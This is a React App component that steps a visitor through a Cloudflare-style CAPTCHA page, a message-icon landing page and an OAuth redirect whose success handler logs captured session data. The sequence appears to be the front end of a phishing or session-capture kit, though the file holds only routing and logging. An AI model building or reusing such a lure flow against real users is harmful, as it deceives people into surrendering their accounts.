import React, { useState } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');

  // Handle the complete flow - starts with CAPTCHA
  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - moving to message icon landing');
    setCurrentPage('message-icon');
  };

  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - moving to OAuth redirect');
    setCurrentPage('oauth-redirect');
  };

  const handleCaptchaBack = () => {
    console.log('⬅️ Back to CAPTCHA (refresh page)');
    window.location.reload();
  };

  const handleOAuthSuccess = (sessionData: any) => {
    console.log('🔐 OAuth successful:', sessionData);
    setCurrentPage('login');
  };

  const handleOAuthBack = () => {
    console.log('⬅️ Back to message icon from OAuth');
    setCurrentPage('message-icon');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );

    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
  }
}

export default App;